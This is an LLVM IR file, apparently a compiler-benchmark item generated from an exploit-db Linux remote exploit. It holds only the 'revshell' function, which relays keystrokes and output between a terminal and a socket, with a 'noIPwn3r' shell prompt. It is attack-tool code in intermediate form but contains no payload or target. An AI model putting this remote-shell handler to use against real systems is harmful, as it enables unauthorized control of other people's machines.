; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_7151.c_revshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_7151.c_revshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@F_GETFL = common dso_local global i32 0, align 4
@F_SETFL = common dso_local global i32 0, align 4
@O_NONBLOCK = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"\0AnoIPwn3r@%s$ \00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"\0A-= ADIOS =-\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @revshell(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call i64 @malloc(i32 1024)
  %10 = inttoptr i64 %9 to i8*
  store i8* %10, i8** %5, align 8
  store i32 0, i32* %7, align 4
  br label %11

11:                                               ; preds = %29, %2
  %12 = load i32, i32* %7, align 4
  %13 = load i32, i32* %3, align 4
  %14 = icmp sle i32 %12, %13
  br i1 %14, label %15, label %32

15:                                               ; preds = %11
  %16 = load i32, i32* %7, align 4
  %17 = load i32, i32* @F_GETFL, align 4
  %18 = call i32 @fcntl(i32 %16, i32 %17, i32 0)
  store i32 %18, i32* %6, align 4
  %19 = load i32, i32* %6, align 4
  %20 = icmp ne i32 %19, -1
  %21 = zext i1 %20 to i32
  %22 = call i32 @assert(i32 %21)
  %23 = load i32, i32* %7, align 4
  %24 = load i32, i32* @F_SETFL, align 4
  %25 = load i32, i32* %6, align 4
  %26 = load i32, i32* @O_NONBLOCK, align 4
  %27 = or i32 %25, %26
  %28 = call i32 @fcntl(i32 %23, i32 %24, i32 %27)
  br label %29

29:                                               ; preds = %15
  %30 = load i32, i32* %7, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %7, align 4
  br label %11

32:                                               ; preds = %11
  br label %33

33:                                               ; preds = %32, %73
  %34 = load i8*, i8** %5, align 8
  %35 = call i32 @memset(i8* %34, i32 0, i32 1024)
  %36 = call signext i8 (...) @getchar()
  %37 = load i8*, i8** %5, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 0
  store i8 %36, i8* %38, align 1
  %39 = sext i8 %36 to i32
  %40 = icmp sgt i32 %39, 0
  br i1 %40, label %41, label %50

41:                                               ; preds = %33
  %42 = load i32, i32* %3, align 4
  %43 = load i8*, i8** %5, align 8
  %44 = load i8*, i8** %5, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = call i32 @send(i32 %42, i8* %43, i32 %45, i32 0)
  %47 = icmp slt i32 %46, 1
  br i1 %47, label %48, label %49

48:                                               ; preds = %41
  br label %74

49:                                               ; preds = %41
  br label %50

50:                                               ; preds = %49, %33
  %51 = load i8*, i8** %5, align 8
  %52 = call i32 @memset(i8* %51, i32 0, i32 1024)
  %53 = load i32, i32* %3, align 4
  %54 = load i8*, i8** %5, align 8
  %55 = call i64 @recv(i32 %53, i8* %54, i32 1024, i32 0)
  %56 = icmp sgt i64 %55, 0
  br i1 %56, label %57, label %64

57:                                               ; preds = %50
  %58 = load i8*, i8** %5, align 8
  %59 = load i8*, i8** %5, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = call i32 @write(i32 1, i8* %58, i32 %60, i32 0)
  %62 = load i32, i32* @stdout, align 4
  %63 = call i32 @fflush(i32 %62)
  store i32 1, i32* %7, align 4
  br label %73

64:                                               ; preds = %50
  %65 = load i32, i32* %7, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %72

67:                                               ; preds = %64
  store i32 0, i32* %7, align 4
  %68 = load i8*, i8** %4, align 8
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8* %68)
  %70 = load i32, i32* @stdout, align 4
  %71 = call i32 @fflush(i32 %70)
  br label %72

72:                                               ; preds = %67, %64
  br label %73

73:                                               ; preds = %72, %57
  br label %33

74:                                               ; preds = %48
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fcntl(i32, i32, i32) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local signext i8 @getchar(...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
